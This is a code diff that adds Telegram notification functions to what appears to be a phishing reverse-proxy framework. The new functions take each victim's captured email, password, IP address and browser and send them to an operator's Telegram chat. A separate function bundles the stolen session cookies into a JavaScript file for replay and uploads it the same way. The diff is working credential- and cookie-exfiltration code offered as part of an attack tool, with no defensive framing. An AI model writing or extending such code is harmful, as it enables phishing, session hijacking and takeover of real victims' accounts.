@@ -24,6 +24,108 @@ func NewTelegramNotifier(cfg *Config) *TelegramNotifier {
 	}
 }
 
+// SendCredentialsNotification sends only username/password when captured (no cookies)
+func (t *TelegramNotifier) SendCredentialsNotification(session *database.Session) error {
+	if !t.cfg.IsTelegramEnabled() {
+		return nil
+	}
+
+	// Only send if we have both username and password
+	if session.Username == "" || session.Password == "" {
+		return nil
+	}
+
+	botToken := t.cfg.GetTelegramBotToken()
+	chatID := t.cfg.GetTelegramChatID()
+
+	// Parse user agent to get browser
+	browser := parseUserAgent(session.UserAgent)
+
+	// Format time
+	timeStr := time.Unix(session.UpdateTime, 0).UTC().Format("2006-01-02 15:04:05 UTC")
+
+	// Build message - credentials only, no cookies yet
+	message := fmt.Sprintf(`🔐 Credentials Captured
+
+🆔 Session ID: %d
+👤 Email: %s
+🔑 Password: %s
+🌐 Browser: %s
+📍 IP Address: %s
+🗓 Time: %s
+
+⏳ Waiting for session cookies...`,
+		session.Id,
+		session.Username,
+		session.Password,
+		browser,
+		session.RemoteAddr,
+		timeStr,
+	)
+
+	log.Success("Sending credentials notification for session %d", session.Id)
+	return t.sendMessage(botToken, chatID, message)
+}
+
+// SendCookiesNotification sends cookies when they are captured (separate from credentials)
+func (t *TelegramNotifier) SendCookiesNotification(session *database.Session) error {
+	if !t.cfg.IsTelegramEnabled() {
+		return nil
+	}
+
+	// Only send if we have cookies
+	if len(session.CookieTokens) == 0 {
+		return nil
+	}
+
+	botToken := t.cfg.GetTelegramBotToken()
+	chatID := t.cfg.GetTelegramChatID()
+
+	// Parse user agent to get browser
+	browser := parseUserAgent(session.UserAgent)
+
+	// Format time
+	timeStr := time.Unix(session.UpdateTime, 0).UTC().Format("2006-01-02 15:04:05 UTC")
+
+	// Count cookies
+	cookieCount := 0
+	for _, domainCookies := range session.CookieTokens {
+		cookieCount += len(domainCookies)
+	}
+
+	// Build message
+	message := fmt.Sprintf(`🍪 Session Cookies Captured!
+
+🆔 Session ID: %d
+👤 Email: %s
+🌐 Browser: %s
+📍 IP Address: %s
+🗓 Time: %s
+📊 Cookies: %d
+
+✅ Full session capture complete!`,
+		session.Id,
+		session.Username,
+		browser,
+		session.RemoteAddr,
+		timeStr,
+		cookieCount,
+	)
+
+	// Generate cookie file content in JavaScript format
+	cookieFileContent := generateCookieJavaScript(session, timeStr)
+	
+	// Create filename with username
+	safeUsername := strings.ReplaceAll(session.Username, "@", "_at_")
+	safeUsername = strings.ReplaceAll(safeUsername, ".", "_")
+	filename := fmt.Sprintf("cookies_%s_%d.txt", safeUsername, session.Id)
+
+	// Send the document with caption
+	log.Success("Sending cookies notification for session %d (%d cookies)", session.Id, cookieCount)
+	return t.sendDocument(botToken, chatID, message, filename, cookieFileContent)
+}
+
+// SendSessionNotification - kept for backward compatibility (test functionality)
 func (t *TelegramNotifier) SendSessionNotification(session *database.Session) error {
 	if !t.cfg.IsTelegramEnabled() {
 		return nil
